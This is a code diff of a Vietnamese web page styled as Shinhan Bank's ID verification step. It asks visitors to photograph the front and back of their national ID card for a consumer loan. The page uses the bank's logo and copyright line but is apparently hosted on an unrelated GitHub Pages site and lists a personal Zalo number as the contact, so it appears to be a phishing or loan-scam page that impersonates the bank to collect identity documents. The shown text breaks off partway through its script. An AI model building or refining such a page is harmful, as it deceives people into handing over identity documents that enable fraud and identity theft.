@@ -2,509 +2,637 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shinhan Bank - Chụp CMND/CCCD</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Shinhan Bank - Xác Thực CMND/CCCD</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
     <style>
+        :root {
+            --primary-color: #0047BB;
+            --secondary-color: #F8FAFC;
+            --accent-color: #28a745;
+            --error-color: #F44336;
+            --text-color: #212529;
+            --border-radius: 12px;
+            --shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s ease;
+        }
         body {
-            font-family: 'Roboto', sans-serif;
-            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--secondary-color), #e6f0fa);
+            color: var(--text-color);
+            line-height: 1.6;
             margin: 0;
-            background-color: #1c2526;
-            color: #e0e0e0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+            padding: 0;
+            overflow-x: hidden;
         }
-        .header {
-            padding: 12px;
-            background-color: #2c3539;
-            border-bottom: 1px solid #4a5a5f;
+        .top-banner {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px 20px;
             display: flex;
+            align-items: center;
             justify-content: space-between;
-            align-items: center;
-            margin-bottom: 0;
+            box-shadow: var(--shadow);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
         }
-        .header img {
-            height: 32px;
+        .top-banner img {
+            height: 45px;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+            transition: var(--transition);
         }
-        .header-icons {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+        .top-banner img:hover {
+            transform: scale(1.05);
         }
-        .header-icons i {
-            font-size: 22px;
-            cursor: pointer;
-            color: #00aaff;
+        .top-banner .nav-links a {
+            color: white;
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-decoration: none;
+            margin-left: 25px;
+            transition: var(--transition);
         }
-        .container {
-            max-width: 90%;
-            width: 100%;
-            margin: 8px 5%;
-            padding: 12px;
-            background: #263238;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-            flex-grow: 1;
-            text-align: center;
-        }
-        main {
-            margin-bottom: 0;
-        }
-        @media (min-width: 768px) {
-            .container {
-                max-width: 700px;
-                margin: 12px auto;
-                padding: 15px;
-            }
-        }
-        @media (max-width: 428px) {
-            body {
-                font-size: 13px;
-            }
-            .container {
-                margin: 6px 3%;
-                padding: 10px;
-            }
-            .header {
-                padding: 10px;
-            }
-            .header img {
-                height: 28px;
-            }
-            .header-icons i {
-                font-size: 18px;
-                gap: 10px;
-            }
-        }
-        .section-title {
-            color: #00aaff;
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            text-transform: uppercase;
+        .top-banner .nav-links a:hover, .top-banner .nav-links a.active {
+            color: var(--accent-color);
         }
         .upload-section {
-            background: #263238;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 0;
+            background: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            margin: 70px auto 90px;
+            max-width: 600px;
+            transition: var(--transition);
         }
-        .camera-container {
-            position: relative;
+        .upload-section:hover {
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+        }
+        .guide-modal {
+            display: flex;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 320px;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 1;
+            transition: var(--transition);
+        }
+        .guide-modal.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .guide-box {
+            background: #f9fbfc;
+            padding: 25px;
+            border-radius: var(--border-radius);
+            text-align: center;
+            max-width: 90%;
+            width: 500px;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .guide-box h3 {
+            color: var(--primary-color);
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        .guide-box ul {
+            list-style: none;
+            padding: 0;
+            text-align: left;
+            max-width: 450px;
             margin: 0 auto;
-            aspect-ratio: 86 / 54;
-            border: 3px solid #00aaff;
+        }
+        .guide-box li {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            font-size: 0.9rem;
+        }
+        .guide-box li i {
+            color: var(--accent-color);
+            margin-right: 12px;
+            font-size: 1.1rem;
+        }
+        .sample-image {
+            width: 90%;
+            max-width: 340px;
+            height: auto;
+            aspect-ratio: 1000 / 440;
             border-radius: 8px;
+            background: #FFFFFF;
+            position: relative;
             overflow: hidden;
-            background: #000;
+            margin: 15px auto;
+            border: 3px solid var(--accent-color);
+            box-shadow: var(--shadow);
         }
-        .camera-container.ready {
-            animation: pulse 1.5s infinite;
+        .sample-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
-        .camera-container.captured {
-            animation: shake 0.5s;
-            border-color: #28a745;
+        .info-icon {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            width: 20px;
+            height: 20px;
+            color: #B0BEC5;
+            cursor: pointer;
+            transition: var(--transition);
         }
-        .camera-container.detected {
-            border-color: #28a745;
-            box-shadow: 0 0 10px #28a745;
+        .info-icon:hover {
+            color: var(--primary-color);
+            transform: scale(1.2);
         }
-        @keyframes pulse {
-            0%, 100% {
-                border-color: #00aaff;
-                box-shadow: 0 0 5px #00aaff;
-            }
-            50% {
-                border-color: #007acc;
-                box-shadow: 0 0 10px #007acc;
-            }
+        .tooltip {
+            display: none;
+            position: absolute;
+            bottom: 30px;
+            right: 0;
+            background: white;
+            padding: 10px 12px;
+            border-radius: 6px;
+            box-shadow: var(--shadow);
+            font-size: 0.9rem;
+            max-width: 220px;
+            z-index: 10;
+            border: 1px solid var(--primary-color);
         }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-5px); }
-            40%, 80% { transform: translateX(5px); }
+        .info-icon:hover + .tooltip {
+            display: block;
         }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(10px); }
-            100% { opacity: 1; transform: translateY(0); }
+        .capture-box {
+            background: #f9fbfc;
+            padding: 25px;
+            border-radius: var(--border-radius);
+            margin-bottom: 25px;
+            text-align: center;
+            transition: var(--transition);
         }
-        .camera-container video {
+        .capture-box:hover {
+            background: #f1f5f9;
+        }
+        .capture-box h3 {
+            color: var(--primary-color);
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        .camera-frame {
+            position: relative;
+            width: 90%;
+            max-width: 450px;
+            height: 280px;
+            margin: 15px auto;
+            border: 3px dashed var(--accent-color);
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            background: #eef2f5;
+        }
+        .camera-frame video, .camera-frame canvas {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
-        .camera-container canvas {
-            display: none;
-            width: 100%;
-            height: 100%;
-        }
-        .camera-overlay {
+        .camera-frame .overlay {
             position: absolute;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            border: 20px solid rgba(0, 0, 0, 0.5);
-            border-radius: 8px;
+            width: 100%;
+            height: 100%;
+            border: 3px solid var(--primary-color);
+            box-shadow: inset 0 0 12px rgba(0, 0, 0, 0.15);
             pointer-events: none;
         }
-        .preview-img {
-            max-width: 100%;
+        @keyframes blink {
+            0% { border-color: var(--accent-color); }
+            50% { border-color: transparent; }
+            100% { border-color: var(--accent-color); }
+        }
+        .blink {
+            animation: blink 0.6s infinite;
+        }
+        .preview-image {
+            width: 90%;
+            max-width: 300px;
             height: auto;
-            border-radius: 4px;
-            margin-bottom: 6px;
-            display: none;
+            aspect-ratio: 3 / 2;
+            margin: 15px auto;
+            border-radius: var(--border-radius);
+            border: 3px solid var(--accent-color);
+            box-shadow: var(--shadow);
         }
-        .upload-box {
-            padding: 10px;
-            margin: 8px 0;
-            border-radius: 8px;
-            background: #2c3539;
+        .preview-image.error {
+            border-color: var(--error-color);
         }
-        .upload-box h3 {
-            color: #e0e0e0;
-            font-size: 14px;
+        .status-message {
+            font-size: 0.9rem;
+            margin: 10px 0;
+            color: var(--primary-color);
             font-weight: 500;
-            margin-bottom: 6px;
-        }
-        .upload-box .instructions {
-            color: #00aaff;
-            font-size: 11px;
-            margin-bottom: 6px;
-            text-align: left;
-            padding-left: 10px;
-        }
-        .upload-box .instructions ul {
-            list-style-type: disc;
-            padding-left: 15px;
-        }
-        .upload-box .instructions li {
-            margin-bottom: 4px;
-        }
-        .upload-box .status {
-            color: #28a745;
-            font-size: 11px;
-            margin-bottom: 6px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-        .upload-box .next-step {
-            color: #28a745;
-            font-size: 11px;
-            margin-top: 6px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-        .button-group-camera {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 8px;
-        }
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 8px 0 0;
-            padding: 6px 0;
-        }
-        .button-group .btn, .button-group-camera .btn {
-            flex: 0 0 auto;
-            min-width: 100px;
-            text-align: center;
-            padding: 5px 10px;
-            font-size: 12px;
-            font-weight: 700;
-        }
-        .banner {
-            margin: 0;
-            padding: 8px;
-            background-color: #2c3539;
-            border-radius: 8px;
-            text-align: center;
-        }
-        .banner img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 4px;
-        }
-        .banner p {
-            color: #e0e0e0;
-            font-size: 12px;
-            margin: 6px 0 0;
-        }
-        .btn-primary {
-            background-color: #007acc;
-            border: none;
-            border-radius: 20px;
-            font-family: 'Roboto', sans-serif;
-            transition: background-color 0.3s ease;
-        }
-        .btn-primary:hover {
-            background-color: #00aaff;
-        }
-        .btn-outline-danger, .btn-outline-primary {
-            border-radius: 20px;
-            padding: 5px 10px;
-            font-size: 12px;
-            font-weight: 500;
-        }
-        .btn-outline-primary {
-            border-color: #00aaff;
-            color: #00aaff;
-        }
-        .btn-outline-primary:hover {
-            background-color: #2c3539;
-            color: #007acc;
-        }
-        .btn-outline-danger {
-            border-color: #ff4d4f;
-            color: #ff4d4f;
-        }
-        .btn-outline-danger:hover {
-            background-color: #3c2f2f;
-            color: #dc3545;
         }
         .error-message {
-            color: #ff4d4f;
-            font-size: 11px;
-            margin-top: 6px;
+            color: var(--error-color);
+            font-size: 0.9rem;
+            margin-top: 10px;
             display: none;
-            text-align: center;
+            background: #fff5f5;
+            padding: 12px;
+            border-radius: var(--border-radius);
+            border: 1px solid var(--error-color);
         }
-        @media (max-width: 428px) {
-            .camera-container {
-                max-width: 280px;
+        .error-icon {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-right: 6px;
+        }
+        .align-icon {
+            position: absolute;
+            width: 24px;
+            height: 24px;
+            color: var(--accent-color);
+            transition: var(--transition);
+        }
+        .auto-icon {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            color: var(--accent-color);
+        }
+        .check-icon {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 20px;
+            height: 20px;
+            color: var(--accent-color);
+            transition: var(--transition);
+        }
+        .check-icon.error {
+            color: var(--error-color);
+        }
+        .btn-primary {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: var(--border-radius);
+            transition: var(--transition);
+        }
+        .btn-primary:hover {
+            background-color: var(--accent-color);
+            border-color: var(--accent-color);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow);
+        }
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+        .fixed-bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 15px;
+            box-shadow: 0 -6px 20px rgba(0, 0, 0, 0.08);
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            z-index: 1000;
+        }
+        .fixed-bottom-bar .btn {
+            flex: 0 1 auto;
+            min-width: 48%;
+            font-size: 1rem;
+            padding: 12px 25px;
+            border-radius: var(--border-radius);
+        }
+        .hidden {
+            display: none;
+            opacity: 0;
+            transition: var(--transition);
+        }
+        .visible {
+            opacity: 1;
+        }
+        .loader {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        footer {
+            background: var(--primary-color);
+            color: white;
+            padding: 25px 0;
+            font-size: 0.9rem;
+        }
+        footer a {
+            color: #ffffff;
+            text-decoration: none;
+            margin: 0 15px;
+            transition: var(--transition);
+        }
+        footer a:hover {
+            color: var(--accent-color);
+        }
+        @media (max-width: 576px) {
+            body {
+                overflow-x: hidden;
             }
-            .button-group, .button-group-camera {
-                gap: 6px;
-                padding: 5px 0;
-                margin: 6px 0 0;
+            .upload-section {
+                max-width: 100%;
+                padding: 20px;
+                margin: 60px auto 80px;
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
             }
-            .button-group .btn, .button-group-camera .btn {
-                min-width: 90px;
-                font-size: 11px;
-                padding: 4px 8px;
+            .capture-box {
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
             }
-            .banner {
-                padding: 6px;
+            .capture-box h3 {
+                font-size: 1.2rem;
             }
-            .banner p {
-                font-size: 11px;
-                margin: 5px 0 0;
+            .guide-box li {
+                font-size: 0.85rem;
             }
-            .upload-box {
-                padding: 8px;
-                margin: 6px 0;
+            .camera-frame {
+                border-width: 2px;
             }
-            .upload-box h3 {
-                font-size: 13px;
-            }
-            .upload-box .instructions, .upload-box p, .upload-box .next-step {
-                font-size: 10px;
-            }
-            .section-title {
-                font-size: 15px;
-                margin-bottom: 6px;
+            .fixed-bottom-bar {
+                padding: 10px;
             }
         }
-        .footer {
-            background-color: #2c3539;
-            color: #e0e0e0;
-            text-align: center;
-            padding: 8px;
-            font-size: 11px;
-            margin-top: 8px;
+        @media (min-width: 577px) {
+            .upload-section {
+                padding: 35px;
+                margin: 80px auto 100px;
+                max-width: 650px;
+            }
+            .guide-box, .capture-box {
+                padding: 30px;
+                margin-bottom: 30px;
+            }
+            .guide-box {
+                max-width: 550px;
+            }
+            .guide-box h3, .capture-box h3 {
+                font-size: 1.4rem;
+            }
+            .guide-box ul {
+                max-width: 500px;
+            }
+            .guide-box li {
+                font-size: 0.9rem;
+            }
+            .guide-box li i {
+                font-size: 1.2rem;
+            }
+            .sample-image {
+                width: 360px;
+                max-width: 360px;
+            }
+            .info-icon {
+                width: 22px;
+                height: 22px;
+            }
+            .tooltip {
+                bottom: 32px;
+                padding: 12px;
+                font-size: 0.95rem;
+                max-width: 240px;
+            }
+            .camera-frame {
+                max-width: 480px;
+                height: 300px;
+            }
+            .preview-image {
+                width: 320px;
+                max-width: 320px;
+            }
+            .status-message {
+                font-size: 1rem;
+            }
+            .error-message {
+                font-size: 0.95rem;
+                padding: 14px;
+            }
+            .error-icon {
+                font-size: 16px;
+            }
+            .align-icon {
+                width: 28px;
+                height: 28px;
+            }
+            .auto-icon, .check-icon {
+                width: 24px;
+                height: 24px;
+            }
+            .btn-primary {
+                padding: 14px 30px;
+                font-size: 1.1rem;
+            }
+            .fixed-bottom-bar {
+                padding: 20px;
+                gap: 25px;
+            }
+            .fixed-bottom-bar .btn {
+                min-width: 180px;
+                font-size: 1.1rem;
+                padding: 14px 30px;
+            }
+            .loader {
+                width: 50px;
+                height: 50px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" onerror="this.src='https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo'" alt="Shinhan Bank Logo">
-        <div class="header-icons">
-            <i class="bi bi-search" aria-label="Tìm kiếm"></i>
-            <div class="dropdown">
-                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Menu"></i>
-                <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                    <li><a class="dropdown-item" href="https://zalo.me/84762797077">LIÊN HỆ</a></li>
-                </ul>
-            </div>
+    <div class="top-banner hidden">
+        <a href="https://vaytieudung.github.io/shinhanbank/"><img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" onerror="this.src='https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg'" alt="Shinhan Bank Logo"></a>
+        <div class="nav-links">
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html" class="active">ĐĂNG KÝ TRỰC TUYẾN</a>
+            <a href="https://zalo.me/84762797077">LIÊN HỆ</a>
+            <a href="#" onclick="switchLanguage('en')">EN</a>
         </div>
     </div>
 
-    <main class="container">
+    <main class="container mt-3">
         <div class="upload-section">
-            <h2 class="section-title">CHỤP CMND/CCCD/HỘ CHIẾU</h2>
-
-            <div class="upload-box" id="frontUpload">
-                <h3>Mặt Trước</h3>
-                <div class="instructions">
+            <div id="guideSection" class="guide-modal">
+                <div class="guide-box">
+                    <h3 data-en="Photo Guide">Hướng Dẫn Chụp Ảnh</h3>
                     <ul>
-                        <li>Đặt CCCD vào khung hình, căn chỉnh 4 góc cho khớp.</li>
-                        <li>Đảm bảo ánh sáng đều, không bị bóng che hoặc phản chiếu.</li>
-                        <li>Không để CCCD bị nghiêng, giữ thẳng và không bị mờ.</li>
-                        <li>Khung sẽ chuyển xanh lá khi căn chỉnh đúng.</li>
+                        <li><i class="fas fa-check"></i> <span data-en="Place ID on a flat, dark surface.">Đặt CCCD trên bề mặt phẳng, tối màu.</span></li>
+                        <li><i class="fas fa-check"></i> <span data-en="Ensure even light (>50 lux), avoid shadows, glare.">Ánh sáng đều (>50 lux), tránh bóng, lóa.</span></li>
+                        <li><i class="fas fa-check"></i> <span data-en="Fit entire ID within the green frame.">Đưa toàn bộ CCCD vào khung xanh.</span></li>
+                        <li><i class="fas fa-check"></i> <span data-en="Hold device parallel, 20-30cm away.">Giữ máy song song, cách 20-30cm.</span></li>
+                        <li><i class="fas fa-check"></i> <span data-en="Do not edit or obscure information.">Không chỉnh sửa, che thông tin.</span></li>
                     </ul>
+                    <div class="sample-image">
+                        <img src="https://www.vietcap.com.vn/api/cms-api/uploads/froala/images/1721812470519.png" alt="Hướng dẫn chụp CCCD">
+                        <i class="fas fa-question-circle info-icon"></i>
+                        <div class="tooltip" data-en="Even light >50 lux, angle 0-10°, 20-30cm away, no obscured info">Ánh sáng đều >50 lux, góc 0-10°, cách 20-30cm, không che thông tin</div>
+                    </div>
+                    <div class="d-flex justify-content-center">
+                        <button class="btn btn-primary" onclick="showFrontCapture()" data-en="Capture Front">Chụp Mặt Trước</button>
+                    </div>
                 </div>
-                <div class="camera-container" id="frontCameraContainer">
-                    <video id="frontCamera" autoplay playsinline></video>
-                    <canvas id="frontCanvas"></canvas>
-                    <div class="camera-overlay"></div>
-                </div>
-                <img id="frontPreview" class="preview-img" src="" alt="Mặt trước">
-                <p id="frontStatus" class="status">Ảnh mặt trước hợp lệ!</p>
-                <p id="frontNextStep" class="next-step">Vui lòng chụp mặt sau CCCD.</p>
-                <div class="button-group-camera" id="frontButtons">
-                    <button class="btn btn-primary" id="captureFrontBtn">Chụp ảnh</button>
-                </div>
-                <p id="frontError" class="error-message">Vui lòng chụp ảnh mặt trước.</p>
             </div>
 
-            <div class="upload-box" id="backUpload" style="display: none;">
-                <h3>Mặt Sau</h3>
-                <div class="instructions">
-                    <ul>
-                        <li>Đặt CCCD vào khung hình, căn chỉnh 4 góc cho khớp.</li>
-                        <li>Đảm bảo ánh sáng đều, không bị bóng che hoặc phản chiếu.</li>
-                        <li>Không để CCCD bị nghiêng, giữ thẳng và không bị mờ.</li>
-                        <li>Khung sẽ chuyển xanh lá khi căn chỉnh đúng.</li>
-                    </ul>
+            <div id="frontSection" class="capture-box hidden">
+                <h3 data-en="Front Image">Hình Ảnh Mặt Trước</h3>
+                <p data-en="Place front of ID in frame, hold steady.">Đưa mặt trước CCCD vào khung, giữ ổn định.</p>
+                <div class="camera-frame" id="frontFrame">
+                    <video id="frontVideo" autoplay playsinline></video>
+                    <canvas id="frontCanvas" class="hidden"></canvas>
+                    <div class="overlay"></div>
+                    <i class="fas fa-arrow-up align-icon hidden" id="frontAlignUp" style="top: 10px; left: 50%; transform: translateX(-50%);"></i>
+                    <i class="fas fa-arrow-down align-icon hidden" id="frontAlignDown" style="bottom: 10px; left: 50%; transform: translateX(-50%);"></i>
+                    <i class="fas fa-arrow-left align-icon hidden" id="frontAlignLeft" style="top: 50%; left: 10px; transform: translateY(-50%);"></i>
+                    <i class="fas fa-arrow-right align-icon hidden" id="frontAlignRight" style="top: 50%; right: 10px; transform: translateY(-50%);"></i>
+                    <i class="fas fa-camera auto-icon" id="frontAutoIcon"></i>
+                    <i class="fas fa-check check-icon" id="frontCheckIcon"></i>
                 </div>
-                <div class="camera-container" id="backCameraContainer">
-                    <video id="backCamera" autoplay playsinline></video>
-                    <canvas id="backCanvas"></canvas>
-                    <div class="camera-overlay"></div>
+                <img id="frontPreview" class="preview-image hidden" alt="Ảnh mặt trước">
+                <div class="loader" id="frontLoader"></div>
+                <p id="frontStatus" class="status-message hidden" data-en="Checking quality...">Đang kiểm tra chất lượng...</p>
+                <p id="frontSuccess" class="status-message hidden" style="color: #28a745;" data-en="Front verified successfully!">Mặt trước đạt yêu cầu!</p>
+                <div class="d-flex justify-content-center gap-3">
+                    <button class="btn btn-primary" id="captureFrontBtn" onclick="captureFront()" data-en="Capture Front">Chụp Mặt Trước</button>
+                    <button class="btn btn-primary hidden" id="nextToBackBtn" onclick="showBackCapture()" data-en="Capture Back">Chụp Mặt Sau</button>
                 </div>
-                <img id="backPreview" class="preview-img" src="" alt="Mặt sau">
-                <p id="backStatus" class="status">Ảnh mặt sau hợp lệ!</p>
-                <p id="backNextStep" class="next-step">Nhấn "Tiếp theo" để hoàn tất!</p>
-                <div class="button-group-camera" id="backButtons">
-                    <button class="btn btn-primary" id="captureBackBtn">Chụp mặt sau</button>
-                    <button class="btn btn-outline-danger" id="retakeBackBtn">Chụp lại</button>
-                </div>
-                <p id="backError" class="error-message">Vui lòng chụp ảnh mặt sau.</p>
             </div>
 
-            <p id="uploadError" class="error-message">Vui lòng chụp cả mặt trước và mặt sau.</p>
-        </div>
+            <div id="backSection" class="capture-box hidden">
+                <h3 data-en="Back Image">Hình Ảnh Mặt Sau</h3>
+                <p data-en="Place back of ID in frame, hold steady.">Đưa mặt sau CCCD vào khung, giữ ổn định.</p>
+                <div class="camera-frame" id="backFrame">
+                    <video id="backVideo" autoplay playsinline></video>
+                    <canvas id="backCanvas" class="hidden"></canvas>
+                    <div class="overlay"></div>
+                    <i class="fas fa-arrow-up align-icon hidden" id="backAlignUp" style="top: 10px; left: 50%; transform: translateX(-50%);"></i>
+                    <i class="fas fa-arrow-down align-icon hidden" id="backAlignDown" style="bottom: 10px; left: 50%; transform: translateX(-50%);"></i>
+                    <i class="fas fa-arrow-left align-icon hidden" id="backAlignLeft" style="top: 50%; left: 10px; transform: translateY(-50%);"></i>
+                    <i class="fas fa-arrow-right align-icon hidden" id="backAlignRight" style="top: 50%; right: 10px; transform: translateY(-50%);"></i>
+                    <i class="fas fa-camera auto-icon" id="backAutoIcon"></i>
+                    <i class="fas fa-check check-icon" id="backCheckIcon"></i>
+                </div>
+                <img id="backPreview" class="preview-image hidden" alt="Ảnh mặt sau">
+                <div class="loader" id="backLoader"></div>
+                <p id="backStatus" class="status-message hidden" data-en="Checking quality...">Đang kiểm tra chất lượng...</p>
+                <p id="backSuccess" class="status-message hidden" style="color: #28a745;" data-en="Back verified successfully!">Mặt sau đạt yêu cầu!</p>
+                <div class="d-flex justify-content-center gap-3">
+                    <button class="btn btn-primary" id="captureBackBtn" onclick="captureBack()" data-en="Capture Back">Chụp Mặt Sau</button>
+                </div>
+            </div>
 
-        <div class="button-group" id="finalButtons" style="display: none;">
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html" class="btn btn-outline-primary">QUAY LẠI</a>
-            <button id="proceedBtn" class="btn btn-primary">TIẾP THEO</button>
-        </div>
+            <p id="uploadError" class="error-message" data-en="<i class='fas fa-times error-icon'></i> Failed. Adjust lighting, position, or check for blur/glare/obscured info."><i class="fas fa-times error-icon"></i> Không đạt yêu cầu. Điều chỉnh ánh sáng, vị trí, hoặc kiểm tra mờ/chói/che thông tin.</p>
 
-        <div class="banner">
-            <img src="https://via.placeholder.com/600x80?text=Shinhan+Bank+Promotion" alt="Shinhan Bank Promotion" onerror="this.src='https://via.placeholder.com/600x80?text=Banner'">
-            <p>Vay tiêu dùng nhanh chóng với lãi suất ưu đãi từ Shinhan Bank!</p>
+            <div class="fixed-bottom-bar">
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html" class="btn btn-outline-secondary" data-en="BACK">QUAY LẠI</a>
+                <button class="btn btn-primary" id="proceedBtn" disabled data-en="CONTINUE">TIẾP TỤC</button>
+            </div>
         </div>
     </main>
 
-    <div class="footer">
-        <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
-    </div>
+    <footer class="bg-light py-3">
+        <div class="container text-center" style="max-width: 650px;">
+            <div class="footer-links">
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html" data-en="Privacy Policy">Chính sách bảo mật</a> |
+                <a href="https://zalo.me/84762797077" data-en="Contact">Liên hệ</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" data-en="Terms of Use">Điều khoản sử dụng</a>
+            </div>
+            <p class="mt-2" data-en="Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd. All rights reserved.">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd. All rights reserved.</p>
+        </div>
+    </footer>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        let frontCaptured = false;
-        let backCaptured = false;
-        let frontImageData = null;
-        let backImageData = null;
+        let frontVerified = false;
+        let backVerified = false;
         let frontStream = null;
         let backStream = null;
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
+        const frontFrame = document.getElementById('frontFrame');
+        const backFrame = document.getElementById('backFrame');
+        const frontPreview = document.getElementById('frontPreview');
+        const backPreview = document.getElementById('backPreview');
+        const frontStatus = document.getElementById('frontStatus');
+        const frontSuccess = document.getElementById('frontSuccess');
+        const backStatus = document.getElementById('backStatus');
+        const backSuccess = document.getElementById('backSuccess');
+        const uploadError = document.getElementById('uploadError');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const guideSection = document.getElementById('guideSection');
+        const frontSection = document.getElementById('frontSection');
+        const backSection = document.getElementById('backSection');
+        const captureFrontBtn = document.getElementById('captureFrontBtn');
+        const nextToBackBtn = document.getElementById('nextToBackBtn');
+        const captureBackBtn = document.getElementById('captureBackBtn');
+        const frontAlignUp = document.getElementById('frontAlignUp');
+        const frontAlignDown = document.getElementById('frontAlignDown');
+        const frontAlignLeft = document.getElementById('frontAlignLeft');
+        const frontAlignRight = document.getElementById('frontAlignRight');
+        const backAlignUp = document.getElementById('backAlignUp');
+        const backAlignDown = document.getElementById('backAlignDown');
+        const backAlignLeft = document.getElementById('backAlignLeft');
+        const backAlignRight = document.getElementById('backAlignRight');
+        const frontCheckIcon = document.getElementById('frontCheckIcon');
+        const backCheckIcon = document.getElementById('backCheckIcon');
+        const frontLoader = document.getElementById('frontLoader');
+        const backLoader = document.getElementById('backLoader');
+        const topBanner = document.querySelector('.top-banner');
+        const fixedBottomBar = document.querySelector('.fixed-bottom-bar');
 
-        // Giả lập âm thanh cảnh báo
-        function playWarningSound() {
-            const audio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
-            audio.play().catch(error => console.error('Error playing warning sound:', error));
-        }
-
-        // Giả lập phát hiện CCCD đúng vị trí (dựa trên kích thước và ánh sáng)
-        function detectCCCDAlignment(video, type) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-            const data = imageData.data;
-            let brightnessSum = 0;
-            let edgeDetected = false;
-
-            // Tính độ sáng trung bình để kiểm tra ánh sáng
-            for (let i = 0; i < data.length; i += 4) {
